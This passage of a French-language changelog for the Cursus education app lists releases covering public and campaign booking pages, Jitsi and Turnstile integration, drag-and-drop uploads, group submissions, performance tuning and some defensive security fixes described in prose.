- Couverture tests campaigns/campaignPublic/jitsi (zero test sur ces routes nouvelles).

## v2.250.0 (2026-04-27)

### Booking : refonte UX/UI des pages publiques (style Calendly)

Les 3 pages publiques de reservation (`/book/:token`, `/book/e/:slug`, `/book/c/:token`) partagent maintenant un seul composant `BookingFlow.vue` avec un layout type Calendly :

- **Layout 2 colonnes** desktop (320px / flex). Gauche : recap permanent (host, titre, duree, visio, fuseau, description). Droite : selection ou formulaire. Sur mobile, passage en 1 colonne.
- **Calendrier mensuel** au lieu d'une grille semaine. Navigation prev/next (sans retour avant le mois courant). Les jours avec creneaux sont colores et cliquables ; les autres sont grises et bloques. Date selectionnee mise en evidence en aplat accent.
- **Slots verticaux** a droite du calendrier, scroll si liste longue, selection en 1 clic.
- **Etape details epuree** : recap RDV en colonne gauche avec bouton "Modifier le RDV" qui retourne au calendrier ; formulaire reduit avec champs nom/email pre-remplis et grise quand l'utilisateur est deja identifie (mode token et campagne). Le formulaire s'adapte au tripartite (separateur "Tuteur entreprise" + 2 champs additionnels).
- **Confirmation centree pleine largeur** : icone success, recap card, boutons "Rejoindre la visio" + "Ajouter au calendrier" (ICS).
- **Captcha Cloudflare Turnstile** (mode event uniquement) integre proprement dans l'etape details, reset automatique apres erreur backend.
- **Fuseau horaire** : detecte automatiquement via `Intl.DateTimeFormat()` et affiche dans le recap + la confirmation.

**Refactoring** :

- Nouveau composant `BookingFlow.vue` qui encapsule toute la logique d'affichage (calendrier mensuel, slots, formulaire, captcha, confirmation).
- Types partages dans `bookingFlow.types.ts` (BookingFlowInfo, BookingFlowResult, BookingFlowSubmitPayload).
- `BookingPage.vue` et `BookingCampaignView.vue` deviennent de simples wrappers qui plug leur composable (`usePublicBooking`, `useCampaignBooking`) sur le flow.
- Nouveau helper `fetchSlotsRange(weeks)` dans `usePublicBooking` qui charge 8 semaines en parallele a l'arrivee. Le calendrier mensuel a directement tous les slots du mois courant + suivant sans pagination.

**Impact code** :

- Suppression d'environ 700 lignes de markup/style dupliquees entre les 3 vues.
- Aucun changement backend ni de schema, uniquement frontend.
- Comportements existants preserves : token nominatif, lien public ouvert avec captcha, campagne tripartite avec ICS.

## v2.249.0 (2026-04-27)

### Booking : Campagnes de RDV (visites tripartites planifiees)

Nouveau primitif "Campagne" : un prof cree une periode bornee (ex: 5-26 mai), definit ses plages hebdo (Mar/Jeu 14h-17h), choisit une promo cible. Cursus pre-genere une invitation par etudiant et envoie un mail au lancement. Chaque etudiant reserve son creneau via un lien personnel `/book/c/:token`. Mail de confirmation tripartite (etudiant + tuteur entreprise + prof) avec ICS attache (METHOD:REQUEST) compatible Outlook/Gmail/Apple sans dependre d'OAuth Microsoft.

**Workflow prof, en clics minimaux** :

1. Onglet Rendez-vous -> bouton "Nouvelle campagne"
2. Formulaire : titre + promo + duree + periode (J0 a J0+21 par defaut) + 1 plage hebdo + tripartite + email de notif. Pre-rempli intelligemment (3 prochaines semaines, mardi 14-17h).
3. "Creer" -> Cursus genere automatiquement les invitations pour la promo.
4. "Lancer (N mails)" -> envoi en lot. Statut passe en `active`.
5. Tableau de suivi : "12/24 reserve" + barre de progression + bouton "Relancer les non-reserves".

**Workflow etudiant** :

1. Mail recu avec lien personnel (`/book/c/:token`).
2. Page le reconnait par son token : nom + email pre-remplis, pas de saisie.
3. 1 clic sur un creneau dispo.
4. Si tripartite : saisit nom + email tuteur entreprise.
5. Confirmation -> mail tripartite avec invitation calendrier .ics.

**Backend** :

- Migration v85 : tables `booking_campaigns` + `booking_campaign_invites`. Campagne = event_type "fantome" auto-cree (slug `__campaign_*`, filtre des listes publiques) + periode + regles JSON.
- Routes admin : CRUD + `launch` + `remind` (relance les pending uniquement) + `close`.
- Routes publiques : `/api/bookings/public/campaign/:token/(info|slots|book)`. Le token resoud le student, pas de saisie redondante.
- Email `sendCampaignInvite` (lien personnel) et `sendTripartiteConfirmation` (3 destinataires + ICS attache).
- ICS etendu : support `attendees`, `METHOD:REQUEST`, `organizer`, UID stable -> Outlook propose Accepter/Refuser sur l'invitation.
- Reutilise `generateSlots` existant en passant `daysCount` = duree de la campagne ; ne re-implemente rien.
- Visio : Jitsi Meet par defaut (chaque RDV = lien unique non devinable).

**Frontend** :

- `useCampaigns` (CRUD + launch/remind/close) et `useCampaignBooking` (page publique etudiant).
- `CampaignManager.vue` : section dans onglet Rendez-vous, expand/collapse par campagne, modal de creation, tableau de suivi avec compteurs et statuts par etudiant.
- `BookingCampaignView.vue` : page `/book/c/:token` avec creneaux groupes par jour, formulaire tuteur si tripartite, ecran de confirmation.

**Tests** :

- 1600 tests backend passent (incluant la suite booking complete).
- 1794 tests frontend passent (les unhandled exceptions canvas-confetti dans les tests `useStudentDeposit*` sont resolues via mock dans `tests/frontend/setup.ts`).

## v2.248.0 (2026-04-27)

### Booking : Jitsi Meet en alternative libre a Teams

Avant : la visio etait soit Microsoft Teams (necessite tenant Azure AD + licence M365 Business), soit une URL fallback statique manuelle. Pas d'option libre out-of-the-box.

Maintenant : nouveau flag `use_jitsi` sur `booking_event_types`. Quand actif, Cursus genere automatiquement un lien Jitsi Meet unique (slug aleatoire 16 chars hex, 64 bits d'entropie) a chaque reservation. Prend le pas sur Teams meme si Microsoft est connecte cote prof.

**Pourquoi Jitsi** :

- Libre (Apache 2.0), gratuit, pas de compte requis cote etudiant.
- API Graph Teams `OnlineMeetings.ReadWrite` n'est pas accessible aux comptes Microsoft personnels (Outlook.com gratuit) — Jitsi resout cette friction pour les profs sans tenant pro.
- Self-hostable plus tard sans toucher au code applicatif (var d'env `JITSI_BASE_URL`).

**Backend** :

- Migration v84 : `booking_event_types.use_jitsi INTEGER NOT NULL DEFAULT 0`.
- Helper `server/utils/jitsi.js` : `generateJitsiUrl()` genere `<JITSI_BASE_URL>/cursus-<random16hex>`. Default `https://meet.jit.si`.
- `publicBooking.js` : nouvelle priorite visio (Jitsi > Teams > fallback URL) sur les 2 routes de reservation (token nominatif + lien public).
- L'URL Jitsi est stockee dans `bookings.teams_join_url` (champ deja utilise pour Teams) — pas de migration de schema cote bookings.
- Le lien Jitsi est inclus dans l'email de confirmation et l'evenement ICS, comme avant pour Teams.

**Frontend** :

- `useBooking.ts` : helper `toggleJitsi(et)` avec toast informatif.
- `TabBooking.vue` : toggle "Visio Jitsi Meet" dans le bloc deplie de chaque type d'evenement, au-dessus du toggle "Lien public ouvert".
- `EventType` interface ajoute `use_jitsi: number`.

**Cas d'usage typique** :

Prof sans compte Azure AD pro -> active `use_jitsi` sur ses types d'evenements -> chaque etudiant qui prend RDV recoit un lien Jitsi unique dans son mail de confirmation. Aucun setup Microsoft requis. La visio fonctionne dans Chrome/Firefox/Safari sans installation.

## v2.247.0 (2026-04-27)

### Booking : Cloudflare Turnstile sur le lien public

Cloture le BLOQUANT identifie par l'audit securite v2.245 ("Cursus utilisable comme relais email/spam"). On ajoute un captcha invisible Cloudflare Turnstile sur la route `POST /api/bookings/public/event/:slug/book`.

Pourquoi Turnstile et pas hCaptcha / reCAPTCHA :

- Gratuit sans plafond, pas de tracker tiers, RGPD-friendly.
- Invisible la plupart du temps (cookie navigateur, telemetrie passive). Une vraie personne ne voit jamais de challenge.
- Pas de dependance npm cote backend ni frontend (script charge a la demande, API HTTP simple).

**Backend** :

- Helper `verifyTurnstile(token, ip)` dans `publicBooking.js` : appelle `https://challenges.cloudflare.com/turnstile/v0/siteverify` avec timeout 5s.
- "Fail closed" : si l'API Turnstile est injoignable, on refuse la reservation (sinon un attaquant pourrait bypass en sabotant la connexion sortante).
- Activation conditionnelle : si `TURNSTILE_SECRET_KEY` n'est pas dans l'env, le check est skippe (mode dev / tests).
- Schema zod `publicBookSchema` etend avec `captchaToken: z.string().optional()`. Reponse 400 + `code: 'captcha_failed'` en cas d'echec.

**Frontend** :

- `BookingPage.vue` charge `https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit` a la demande quand on entre dans l'etape "details", uniquement en mode `event` (lien public ouvert) et uniquement si `VITE_TURNSTILE_SITE_KEY` est definie au build.
- Bouton "Confirmer le rendez-vous" disabled tant que le widget n'a pas emis son token.
- Le widget est reset apres un echec backend pour forcer une nouvelle verification.
- Cleanup automatique a `onBeforeUnmount` (pas de leak DOM).

**Configuration** :

Documentee dans `server/.env.example`. Obtenir une paire site-key / secret-key gratuitement sur `dash.cloudflare.com` -> Turnstile. La site-key est exposee dans le bundle (publique), la secret-key reste cote serveur.

**Effet sur l'attaque "relay email"** :

L'attaquant doit desormais resoudre un challenge Turnstile par reservation. Cloudflare bloque les UA scrapers, les datacenter IPs et les sessions sans empreinte navigateur coherente. Le cout passe d'un POST gratuit a une charge non triviale (orchestration headless + rotation residentielle), suffisant pour decourager le scenario decrit dans l'audit.

## v2.246.0 (2026-04-27)

### Booking : durcissement du lien public (post-audit)

Audit securite + UX du mode "lien public ouvert" introduit en v2.245. 3 categories de fixes.

**Anti-spoofing (subject Outlook + body)** :

- Nouveau helper `sanitizePlainText()` dans `server/utils/escHtml.js` : strippe CR/LF/TAB (injection d'en-tetes RFC5322), caracteres de controle ASCII, zero-width (U+200B..U+200F), marques bidi (U+202A..U+202E, U+2066..U+2069) et BOM (U+FEFF).
- `attendeeName` (lien public) et `tutorName` (lien token nominatif) passes par `sanitizePlainText` des l'entree, refus avec 400 si le nom devient vide apres sanitize.
- Subject Outlook utilise desormais `sanitizePlainText` au lieu de `escHtml` (le subject n'est pas du HTML : `escHtml` introduisait `&amp;` litteraux dans les noms et n'eliminait pas les CR/LF).

**Anti-enumeration de slug** :

- Activation de `is_public` cote backend : si le slug courant est inferieur a 10 caracteres, il est automatiquement allonge avec un suffixe hex de 5 caracteres (ex: `jean` -> `jean-a3f2c`). Empeche l'enumeration par dictionnaire de prenoms / noms courts.
- Le toast cote prof annonce explicitement le nouveau slug (`Lien public active. Slug allonge en "jean-a3f2c" pour la securite.`).
- `slug` ajoute a la liste blanche du `updateEventType` model.

**UX page etudiant** :

- Placeholder email passe de `email@entreprise.com` a `prenom.nom@exemple.fr` en mode public ouvert (la page n'est plus exclusivement pour les tuteurs entreprise).
- Inputs nom + email avec `autocomplete="name"` / `autocomplete="email"` et `id`/`for` corrects pour autofill mobile + a11y.
- Backend distingue 4 codes d'erreur (`invalid_link`, `not_found`, `closed`, `inactive`) au lieu d'un message generique. La page etudiant affiche un titre et un sous-texte adaptes (ex: "Reservations fermees" + "Si tu attendais une reponse de cet enseignant, contacte-le directement").

**Reste BLOQUANT non resolu** : pas de CAPTCHA. Cursus reste theoriquement utilisable comme relais email (envoi de mails de confirmation a des tiers via slug devine + email arbitraire). Mitigation operationnelle pour l'instant : limites de rate (20 req/min/IP, 30 req/min/slug) + slug allonge. CAPTCHA / hCaptcha a ajouter en v2.247 si signal d'abus detecte.

## v2.245.0 (2026-04-27)

### Booking : lien public ouvert (Calendly classique)

Avant : chaque RDV necessitait un token nominatif genere pour un etudiant precis (lien personnel a chaque destinataire).
Maintenant : un type d'evenement peut etre marque `is_public` pour exposer une page publique unique a partager a tout le monde, sans inscription Cursus.

**Backend** :

- Migration v83 : `booking_event_types.is_public INTEGER NOT NULL DEFAULT 0`.
- Nouveau modele `getPublicEventTypeBySlug(slug)` (refuse si `is_active = 0` ou `is_public = 0`).
- Routes publiques `GET /api/bookings/public/event/:slug`, `GET /event/:slug/slots`, `POST /event/:slug/book` et `GET /event/:slug/booking/:id/ics`.
- Reservation publique = `student_id = 0` (sentinelle, pas de FK), seuls `tutor_name` / `tutor_email` portent les coordonnees du visiteur.
- Rate limiter dedie par slug (`30 req/min/slug`) en plus du limiter IP (`20 req/min/IP`).
- Integration Microsoft inchangee : creation Teams + Outlook + email de confirmation se declenche quand le prof a connecte son compte.
- `getBookingByCancelToken` en LEFT JOIN sur `students` pour supporter les RDV publics ; `cancellation` redirige le rebookUrl vers `/book/e/:slug` au lieu de regenerer un token nominatif.
- Route admin `GET /api/bookings/event-types/:id/public-link` pour previewer l'URL avant activation.

**Frontend** :

- Composable `usePublicBooking(identifier, mode)` : `mode = 'token'` (lien nominatif, defaut) ou `'event'` (lien public ouvert).
- Vue `BookingPublicEventView.vue` montee sur la route hash `/book/e/:slug`.
- `TabBooking.vue` : nouvelle section "Lien public ouvert" dans le bloc deplie de chaque type d'evenement, avec toggle on/off, URL, bouton "Copier" et QR code.
- Helpers `togglePublic(et)` et `getPublicUrl(et)` exposes par `useBooking`.

## v2.202.0 (2026-04-20)

### Drag-drop : composable modernise + composant unifie

Amelioration du design du composable `useSimpleFileDrop` et extraction d'un composant `<FileDropZone>` pret a l'emploi.

**Composable `useSimpleFileDrop` v2** :

- **Drag counter** interne : plus de flicker `isDragOver` quand la souris passe sur les enfants de la zone (bug classique du `dragenter`/`dragleave` qui se declenchent pour chaque descendant).
- **Machine a etats** : `status = 'idle' | 'drag-over' | 'processing' | 'success' | 'error'`. Les consumers peuvent peindre une animation differente par etat.
- **Auto-reset** apres succes/erreur (`successResetMs`, defaut 1.5s) pour animer un flash "depot recu" sans boilerplate.
- **Bindings object** : `v-bind="drop.bindings"` remplace le cablage des 4 handlers. API plus courte.
- **Disabled reactif** : passe un `Ref<boolean>` / `ComputedRef<boolean>` pour bloquer dynamiquement (ex: tant que le promoId n'est pas choisi).
- **`requireElectronPath`** : option pour rejeter les drops web quand l'app a besoin d'un path filesystem.
- **Handlers async + gestion d'erreur** : si le `onDrop` throw, status passe a 'error' + toast. Plus silencieux.
- **API legacy preservee** : `isDragOver`, `onDragEnter/Over/Leave`, `onDrop` restent exposes, aucun breaking change pour les consumers v2.201.

**Composant `<FileDropZone>`** (`@/components/ui/FileDropZone.vue`) :

- Zone de drop pre-stylee, accessible (role button, keyboard Enter/Space, aria-busy).
- Props : `accept`, `allowedExtensions`, `maxBytes`, `multiple`, `disabled`, `label`, `hint`, `dragOverLabel`, `processingLabel`, `successLabel`, `variant` (`default` | `compact`), `requireElectronPath`.
- Icones automatiques par status (Upload / Loader2 / CheckCircle2 / AlertCircle).
- Animations : halo + scale en drag-over, flash en success, shake en error. `prefers-reduced-motion` respecte.
- Slot `#icon` pour override.
- ImportStudentsModal migre comme demo (supprime ~30 lignes de CSS + markup inline).

## v2.201.0 (2026-04-20)

### Drag-and-drop partout + composable moderne

Audit UX/UI : apres le drag-drop du depot etudiant (v2.200), scan complet des surfaces d'upload (etudiant + prof) pour combler les trous. Extraction d'un composable centralise et modernise.

**Composable `useSimpleFileDrop`** modernise :

- API unifiee a base d'array `FileDropItem[]` (single ou multi-file).
- Chaque item expose `path` (Electron), `file` (objet File brut pour FileReader / FormData), `name`, `size`, `type` (MIME).
- Validation declarative : `maxBytes`, `allowedExtensions`, `accept` MIME pattern (`'image/*'`, `'application/pdf'`, etc.).
- Support `multiple: true` pour le multi-file.
- Fallback propre si `file.path` Electron indispo (toast d'erreur clair).

**Surfaces equipees** :

- **`RessourcesModal`** (prof ajoute ressource a un travail) : zone cliquable + drop. Pre-remplit le nom si vide.
- **`ImportStudentsModal`** mode CSV : zone drop visible dans le body + validation extension `.csv`/`.txt`. Skip le dialog natif.
- **Preload `importStudents(promoId, path?)`** : accepte path optionnel pour drag-drop, backward-compat avec les callers existants.
- **Photo de profil** (`SettingsAccount` + `LoginOverlay` register form) : l'avatar lui-meme devient drop-zone. Accept `image/*`, max 5 Mo. Lit via `FileReader` et set le data URI. Badge "Deposer ici" + halo accent au drag-over.
- **`StudentDepositForm`** refactore pour utiliser le composable (supprime ~30 lignes dupliquees).

## v2.200.0 (2026-04-20)

### UX depot etudiant

Deux frictions haute priorite identifiees lors de l'audit UX/UI devoirs etudiant, les deux susceptibles de causer des litiges au pilote CESI sept 2026.

- **Drag-and-drop sur la zone de depot** : on pouvait uniquement cliquer pour ouvrir le file picker. Desormais l'etudiant peut glisser un PDF/image/archive directement sur la zone. La zone affiche un etat actif ("Relacher pour deposer" + halo accent) pendant le hover. Limite 50 Mo respectee, fallback toast si `file.path` Electron indisponible.
- **Avertissement ecrasement depot de groupe** : v2.199 autorise n'importe quel membre a ecraser le depot de l'equipe sans signal. Un etudiant pouvait ecrabouiller le rendu d'un camarade par erreur. Desormais, une confirmation `useConfirm` apparait : *"Alice a deja depose projet-v1.pdf pour ce devoir de groupe. Votre fichier va le remplacer (la version precedente sera perdue)."* Bouton `Remplacer` (warning) + `Annuler`. Le depot solo et le depot groupe par le meme etudiant ne declenchent pas le prompt.

## v2.199.0 (2026-04-20)

### Devoirs de groupe — modele "un depot = toute l'equipe"

Refonte du workflow depot pour les devoirs de groupe, suite deep-interview `deep-interview-devoirs-groupe-depot-v1.md` (ambiguite finale 9%).

**Avant** : chaque membre d'un groupe devait redeposer son propre fichier. Alice rendait → Bob/Chloe/David voyaient "pas rendu" sur leur propre vue, le prof voyait 1/4. Bug serieux : `markNonSubmittedAsD` mettait D aux 3 membres dont le groupe avait pourtant rendu via Alice.

**Apres v2.199** : un seul depot represente le groupe. N'importe quel membre peut soumettre ou ecraser. Note et feedback partages entre tous. L'etudiant voit "Rendu par Alice" dans sa propre vue si un autre membre a soumis.

### Implementation

- **Migration DB v77** : `depots.group_id` + backfill + dedup (garde le depot le plus recent par (travail, groupe)) + index partial `idx_depots_group`.
- **Backend `addDepot`** : chemin groupe separe — SELECT existant par `(travail_id, group_id)` → UPDATE ou INSERT. `student_id` sur depot = dernier uploader (pas d'historique v1, conforme a la spec).
- **Backend `getStudentTravaux` + `getTravauxSuivi`** : le LEFT JOIN depots matche soit le depot individuel (s.id) soit le depot partage du groupe (group_id = t.group_id). Expose `depot_author_id` et `depot_author_name`.
- **Backend `markNonSubmittedAsD`** : pour un travail de groupe, insere au plus 1 D pour le groupe entier (pas 4 D sur les 4 membres). Skip si le groupe a deja rendu.
- **Frontend `StudentDevoirCard`** : affiche "Rendu par Alice" quand le depot est un depot de groupe soumis par un autre membre.
- **5 nouveaux tests** couvrent : creation de depot de groupe, ecrasement inter-membres, visibilite cross-membre (Chloe voit le depot de Bob), immunite de `markNonSubmittedAsD`, fallback D sur groupe sans depot.

### Hors scope v1

- Override note-par-membre (free-rider problem) → v2 si le retour terrain le demande.
- Feedback individuel differencie → meme feedback pour tous en v1.
- Historique de versions → ecrasement = perte de version precedente.
- Designation d'un leader / co-signature.

## v2.198.0 (2026-04-20)

### Fix

Les types CCTL, soutenance et etude de cas ne doivent jamais apparaitre comme "a rendre" ni "non rendu" — ce sont des evaluations en salle, pas des devoirs a deposer.

**5 sites avaient un check isEventType incomplet** (oubliaient `etude_de_cas`), causant l'apparition de ces examens dans la liste "A rendre" cote etudiant + les stats de pending :
- `useDevoirsTeacher.ts` (statut Complet calcule sur les soutenances)
- `StudentTimelineModal.vue` + `StudentProjetDevoirsList.vue` (filtre overdue/urgent)
- `useStudentProjetDevoirs.ts` (pending computed)
- `FriseCalendar.vue` (forme diamant dans le calendrier)

Tous migres vers `isEventType` centralise dans `utils/devoir.ts`.

### Defense en profondeur

- **Migration DB v76** : `UPDATE travaux SET requires_submission = 0 WHERE type IN ('cctl', 'soutenance', 'etude_de_cas')` — corrige les devoirs crees avant le fix auto du `NewDevoirModal`.
- **Backend `createTravail`** : force `requires_submission = 0` pour les types evenement peu importe ce que le client envoie.
- **`DevoirMetaSection` (modal gestion)** : le toggle "Requiert un depot", la progress bar "X/Y rendus" et le statut "Complet" sont masques pour les types evenement.

## v2.197.0 (2026-04-20)

### Bundle + perf

Suite de l'audit perf avec benchmark systematique avant shipping.

- **Cahiers collaboratifs desactives** (non utilises pour le pilote CESI 2026) : entree UI retiree de DocumentsView et des widgets dashboard (student + teacher). Composants, store et deps restent en place pour pouvoir reactiver sans migration. **DocumentsView : 1237 Ko -> 86 Ko** (-93%, TipTap + Yjs + Hocuspocus tree-shake).
- **highlight.js -> /lib/common** (36 langages courants au lieu de 190). HLJS_AUTO_SUBSET (shipped en v2.195.1) narrow deja a 11 langages, aucune regression fonctionnelle. **LumenView : 2134 Ko -> 945 Ko** (-55%). La fast path Lumen (lire un chapitre) est dramatiquement plus legere.
- **`loadReminders` dans `Promise.all`** (useDashboardTeacher) : fusionne l'IPC des rappels avec les 4 autres appels du batch initial du dashboard teacher. Economise 1 IPC round-trip sequentiel (~5-20 ms).

### Bundle total : 25 Mo -> 24 Mo

### Faux positifs confirmes par benchmark

- **Prepared statements caches au module-level** : mesure 3x plus rapide sur `.prepare()` (8.2us -> 2.7us) mais un dashboard complet n'execute que ~8 queries = 40us total, pas assez de ROI pour un refactor de 50+ fonctions.

## v2.196.1 (2026-04-20)

### Performance DB

Audit dedie de la base SQLite (better-sqlite3) — 2 safe wins de gros impact.

- **PRAGMAs tunes** dans `connection.js#applyPragmas` :
  - `synchronous = NORMAL` (combine avec WAL deja actif) : ~2-3x les writes. La DB reste coherente ; seul le tout-dernier commit peut etre perdu si l'OS crashe pendant un fsync — acceptable en Electron local.
  - `cache_size = -10000` (10 MB au lieu des 2 MB default) : plus de page churn sur les jointures messages/depots/students dans le dashboard prof.
  - `mmap_size = 30000000` (30 MB mappes) : evite les `read()` syscalls sur les hot tables.
- **`seedIfEmpty()` en transaction** : les ~200 INSERTs du seed initial passent de 200 fsync a 1 seul (~100 ms -> ~10 ms sur premier lancement ou reset).

### Notes d'audit

L'audit a liste des gains plus importants mais plus risques, laisses pour une release dediee :
- Subqueries correlees dans `getTravaux()` (3 `COUNT(*)` correles) — refactor en CTE (+40% dashboard prof).
- `messages.reactions` en TEXT JSON -> table `message_reactions` normalisee (agregats DB).
- `channels.members` JSON -> table `channel_members`.

## v2.196.0 (2026-04-20)

### Performance

Pass complet d'audit + optimisations ciblees sur le cold start, le bundle renderer et la couche DB.

- **Cold start** : le splash screen est peint **avant** `db.init()` — l'utilisateur voit un retour visuel immediat meme quand SQLite rejoue les migrations (500-1500 ms sur bump de version).
- **Bundle renderer** : `@marp-team/marp-core` (~1 MB) devient `await import()` dynamique dans `LumenSlideDeck` — plus embarque dans le bundle principal tant qu'un chapitre Marp n'est pas ouvert.
- **Modales async** : 18 modales passent en `defineAsyncComponent` (SettingsModal, NewDevoirModal, etc.). Chacune devient un chunk separe, charge au 1er usage. Economie ~400-800 Ko de JS parse au boot. Restent synchrones : `ConfirmModal`, `CmdPalette` (hot paths), `ChangePasswordModal` (1re connexion).
- **DB** : migration v75 ajoute `idx_travaux_channel ON travaux(channel_id)` — accelere `getTravaux(channelId)` et le TeacherProjectHome sur promos chargees (full scan -> index lookup).

### Notes d'audit

L'audit a aussi liste des recommandations plus lourdes (normaliser `channels.members` JSON en table dediee, reduire les `COUNT(*)` correles dans `getTeacherSchedule`, adopter `v-memo`/`shallowRef` dans MessageList). Elles sont laissees pour une release dediee car plus risquees.

## v2.195.1 (2026-04-20)

### Performance

- **Markdown reader** : highlightAuto restreint a 11 langages courants (au lieu des 190 charges par hljs). Gain >10x sur les blocs de code sans langue declaree (~590ms -> ~50ms), reglait un timeout du test `markdown.test.ts:151`.

### Cleanup

- Suppression de la dependance `vue-cal` (plus utilisee depuis la refonte grilles custom), du fichier `vue-cal.d.ts` et des commentaires residuels dans `stores/agenda.ts`, `useAgendaFilters.ts`, `useAgendaIcsExport.ts`, `AgendaMonthGrid.vue`, `AgendaTimeGrid.vue`.
- `useAgendaViewNav` : retrait des champs vestigiaux `calRef` et `onViewChange` (aucun appelant).

## v2.195.0 (2026-04-20)

### Merge main <- branche v2.188

Reconciliation des deux axes de travail paralleles autour de l'agenda et des menus contextuels.

- **Agenda** : adoption des grilles custom `AgendaMonthGrid` + `AgendaTimeGrid` (remplacent VueCal), avec conservation du persist localStorage de la vue active (`cc_agenda_view`) et de la barre de recherche avec raccourci `/`.
- **`useContextMenu`** : composable unifie supportant les deux patterns utilises dans le codebase :
  - **Mode items** (`const { state, open, close } = useContextMenu()`) : items passes directement a `open(ev, items)`.
  - **Mode target** (`const { ctx, open, close } = useContextMenu<T>()`) : la cible sert a calculer les items dans un `computed`.
- **`useAgendaViewNav`** : navigation prev/next par vue (mois/semaine/jour) + persistance localStorage de la vue active.
- **CSS AgendaView** : suppression des overrides VueCal (plus utilises).

## v2.188.0 (2026-04-20)

### Nouvelles fonctionnalites

- **Menus contextuels (clic droit)** sur 17 nouvelles zones + enrichissement du menu message :
  - Nouveau composable `useContextMenu<T>()` pour factoriser le pattern
  - `CahierList` : ouvrir, copier titre, renommer, supprimer
  - `AgendaDayNotes` : copier texte, supprimer
  - `ProjectListPanel` : copier nom, renommer, supprimer
  - `LumenOutline` : aller a la section, copier titre/ancre
  - `PinnedBanner` : aller au message, copier contenu, desepingler
  - `LumenChapterPickerModal` : lier, copier titre/chemin/repo
  - `IntervenantsModal` : gerer canaux, copier email/nom, mailto, supprimer
  - `ClasseModal` : profil, DM, copier nom/note
  - `WidgetNotationPending` : ouvrir rendus/devoir, copier titre
  - `WidgetAtRisk` : profil, DM, copier nom/score
  - `LumenRepoSidebar` : ouvrir chapitre, copier titre/chemin/lumen://, marquer lu
  - `SidebarFichiers` : voir fichiers, DM, filtrer images/docs, copier nom
  - `Leaderboard` : copier nom/score, DM, encourager
  - `MessageWall` : copier, aimer, masquer, supprimer, signaler
  - `LumenAnnotations` : copier passage/commentaire, modifier, supprimer
  - `BookingPage` : reserver, copier date/lien, ajouter a Google Calendar
  - `AccueilActivityTile` : ouvrir rendus/devoir, copier libelle
  - `MessageBubble` enrichi : copier lien/ID/auteur, mettre en signet, DM a l'auteur

## v2.2.3 (2026-03-29)

### Nouvelles fonctionnalites

- **DMs etudiant-etudiant** : les etudiants peuvent s'envoyer des messages directs au sein de leur promo
- **Queue offline** : les messages non envoyes sont stockes localement et re-envoyes a la reconnexion
- **Retry automatique** : 3 tentatives avec backoff exponentiel sur echec reseau
- **Archivage de canaux** : un responsable peut archiver un canal (invisible, lecture seule, restaurable)
- **Gestion des membres** : ajout/retrait d'etudiants dans les canaux prives depuis le panneau membres
- **Header de canal enrichi** : description, compteur de membres et badge type (Chat/Annonces)
- **Bouton admin SSO** : connexion automatique au panneau d'administration sans re-saisie de mot de passe
- **Validation fichiers upload** : taille max 50 Mo, extensions dangereuses bloquees, path traversal

### Corrections

- Page admin reservee aux administrateurs uniquement (plus les teachers)
- URL admin corrigee vers admin.cursus.school
- admin.cursus.school retournait "Non authentifie" au lieu du formulaire de login
- Lighthouse CI retire app.cursus.school (SPA avec login = NO_FCP)
- Type `authorType` dans la queue DM corrige (string literal union)
- Tests live routes alignes sur l'isolation promo (v2.1.6)

### Securite

- 17 routes securisees avec middleware isolation promo (live, rex, projects)
- Export REX reserve aux responsables (etait ouvert a tous)

### Robustesse

- Recherche DM limitee a 200 resultats (plus d'explosion memoire)
- Validation destinataire avant envoi de DM
- `safeStorage` integre dans useStudentReminders, usePrefs, documents store
- `depositValidation` integre dans useStudentDeposit avant chaque upload
- `safeAuthorType`/`safeUserType` centralises dans toutes les insertions DB

### Tests

- 60 tests canaux (archivage, membres, header, isReadonly)
- Tests DMs etudiant-etudiant (backend + frontend)
- Tests retry/queue (messages-retry.test.ts)
- Tests dmQueue, searchDmMessages limit, validation destinataire
- Tests channelMemberCount helper + app store archived

---

## v2.0.9 (2026-03-29)

### Nouvelles fonctionnalites

- Modules activables/desactivables depuis le panneau d'administration (audit securite inclus)
- Wizard d'onboarding pour les nouveaux utilisateurs
- Metriques d'adoption : DAU/WAU et alertes d'inactivite
- Les noms des executables incluent desormais le numero de version (Cursus-2.0.9-win.exe, etc.)
- La version de l'executable est synchronisee automatiquement depuis le tag git au moment du build CI

### Corrections

- Les documents de la promo CPIA2 etaient invisibles a cause d'une collision de noms de fonction entre deux modeles (`getProjectDocuments` duplique)
- Les administrateurs ne pouvaient pas envoyer de messages (contrainte CHECK `author_type` ne reconnaissait que `teacher` et `student`)
- Le mapping des types utilisateur est desormais centralise (`safeAuthorType`/`safeUserType`) pour eviter les crashs sur les roles `admin` et `ta`
- Bug critique corrige : le computed `roleLabel` dans les parametres du compte ecrasait l'import du meme nom, causant un TypeError au runtime
- L'ancien fichier de base de donnees `cesi-classroom.db` est automatiquement renomme en `cursus.db` au premier demarrage
- Onglet promotions vide et role/email manquants dans les parametres corriges
- Modale RGPD rendue conforme
- UX mise a jour des parametres amelioree (barre de progression, spinner, etats clairs)
- Securite DM renforcee, migration robuste, indexes ajoutes

### Ameliorations

- Renommage des labels de roles : Pilote devient **Responsable**, les labels sont centralises dans `ROLE_LABELS`
- Toutes les references a l'ancien nom `cesi-classroom` et `slack-like-electron` mises a jour vers `cursus`
- Landing page amelioree (SVGs inline, manifeste PWA, accessibilite clavier)
- Catch vides remplaces par `console.warn` dans le store principal

### Tests

- Tests de regression pour le mapping `author_type` (admin, ta, teacher, student)
- Tests unitaires pour `safeAuthorType` et `safeUserType`
- Tests d'integration : admin et TA peuvent envoyer des messages via l'API
- Suite de stabilite complete : 78 fichiers, 1017+ tests
- Couverture regression documents vides et fallback projet invalide

### Infrastructure

- `package-lock.json` synchronise avec `package.json` (version 2.0.4)
- CI : `npm version` injecte automatiquement la version du tag avant le build
- Noms d'artefacts dynamiques pour Windows, Mac et Linux

---

## v1.0.16 (2026-03-28)

### Corrections

- Les noms des membres du groupe s'affichent maintenant correctement pour les etudiants (l'API utilisee etait reservee aux enseignants)
- Le widget customizer met a jour les widgets immediatement sans recharger la page
- Les bookmarks s'affichent correctement dans le widget (mauvaise cle localStorage corrigee)

### Ameliorations

- Nouveau panneau de personnalisation des widgets : sections Actifs/Disponibles, drag-and-drop pour reordonner, toggles visuels
- 15+ casts `as any` supprimes, types precis ajoutes dans l'API IPC (getDmFiles, getEngagementScores, getTeacherNotes, getStudentProfile)
- Accessibilite : navigation clavier (Space/Enter) sur les boutons de widgets, aria-labels sur les widgets non-interactifs, role=tablist sur le dashboard
- Sections collapsibles de la sidebar accessibles au clavier (Enter/Space + aria-expanded)
